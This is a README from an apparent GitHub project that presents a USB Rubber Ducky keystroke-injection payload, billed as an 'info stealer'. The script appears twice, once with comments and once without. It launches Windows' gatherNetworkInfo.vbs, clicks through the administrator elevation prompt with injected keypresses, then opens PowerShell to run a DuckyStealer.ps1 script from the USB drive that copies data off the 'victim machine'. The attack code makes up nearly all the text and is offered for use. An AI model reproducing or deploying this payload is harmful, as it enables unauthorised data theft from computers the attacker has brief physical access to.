# Rubber_Ducky_Gather_Network_Info
A very quickly script for rubber ducky which exploits the gatherNetworkInfo.vbs file in the</BR>
C:\Windows\System32 folder to steal different information from the victim machine.

![Alt text](https://github.com/JonnyBanana/Rubber_Ducky_Gather_Network_Info/blob/master/images/PrivacyPolicy.png "Rubber_Ducky_Gather_Network_Info by JonnyBanana")

<h2>Gather_Network_Info_Script</h2>

REM gathernetworkInfo a info stealer script by JonnyBanana
</BR>
REM https://github.com/JonnyBanana
</BR>
REM large delay beacause Windows require a lot of time to read the Ducky with twin duck firmware
</BR>
DELAY 10000
</BR>
GUI R
</BR>
DELAY 200
</BR>
STRING cmd  /C "start gatherNetworkInfo.vbs"  
DELAY 200
</BR>
REM run as admin
</BR>
CTRL-ALT ENTER
</BR>
DELAY 100
</BR>
LEFTARROW
</BR>
DELAY 100
</BR>
ENTER
</BR>
REM the scripts require a little of time to create the files....
</BR>
DELAY 15000
</BR>
CTRL ESC
</BR>
DELAY 200
</BR>
STRING powershell
</BR>
DELAY 200
</BR>
ENTER
</BR>
DELAY 200
</BR>
REM the Rubber Ducky MUST renamed on " _ " (bottom bar)
</BR>
STRING .((gwmi win32_volume -f 'label=''_''').Name+'DuckyStealer.ps1')
</BR>
DELAY 200
</BR>
ENTER
</BR>
REM the last command  takes about thirty seconds to copy all the informations
</BR>
REM so be patient...



<h6>Script Without Comments</H6>

DELAY 10000
</BR>
GUI R
</BR>
DELAY 200
</BR>
STRING cmd  /C "start gatherNetworkInfo.vbs"  
DELAY 200
</BR>
CTRL-ALT ENTER
</BR>
DELAY 100
</BR>
LEFTARROW
</BR>
DELAY 100
</BR>
ENTER
</BR>
DELAY 15000
</BR>
CTRL ESC
</BR>
DELAY 200
</BR>
STRING powershell
</BR>
DELAY 200
</BR>
ENTER
</BR>
DELAY 200
</BR>
STRING .((gwmi win32_volume -f 'label=''_''').Name+'DuckyStealer.ps1')
</BR>
DELAY 200
</BR>
ENTER
</BR>




<h3>Quack Yo Life!!!</h3>
</BR>

![Alt text](https://github.com/JonnyBanana/Rubber_Ducky_Gather_Network_Info/blob/master/images/fun.png "Rubber_Ducky_Gather_Network_Info by JonnyBanana")
